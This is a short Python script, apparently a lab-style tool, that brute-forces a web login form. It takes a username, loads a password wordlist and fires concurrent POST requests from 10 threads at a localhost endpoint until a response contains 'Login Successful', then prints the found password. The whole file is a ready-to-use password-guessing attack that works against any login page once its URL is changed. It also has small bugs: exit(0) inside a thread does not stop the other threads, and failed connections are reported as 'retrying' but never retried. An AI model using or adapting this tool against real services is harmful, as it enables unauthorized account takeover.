import requests
import threading
from queue import Queue

# Define the target URL
url = "http://localhost:5000"

# Use raw string or double backslashes for the Windows path
file_path = r"#your_password-filepath"

# Get the username from the user
username = input("Username you want to brute force: ").strip()

# Thread-safe queue for passwords
password_queue = Queue()

# Read passwords into queue
with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
    for password in file:
        password_queue.put(password.strip())

# Function to try passwords
def brute_force():
    while not password_queue.empty():
        password = password_queue.get()
        data = {"username": username, "password": password}
        
        try:
            response = requests.post(url, data=data, timeout=5)
            if "Login Successful" in response.text:
                print(f"[+] SUCCESS: Username: {username}, Password: {password}")
                exit(0)  # Stop all threads
            else:
                print(f"[-] FAILED: {password}")
        except requests.exceptions.RequestException:
            print(f"[!] Connection error, retrying {password}...")
        password_queue.task_done()

# Number of threads to use
THREAD_COUNT = 10  # Adjust based on CPU power

# Create and start threads
threads = []
for _ in range(THREAD_COUNT):
    thread = threading.Thread(target=brute_force)
    thread.start()
    threads.append(thread)

# Wait for all threads to finish
for thread in threads:
    thread.join()

print("Brute force attack complete.")

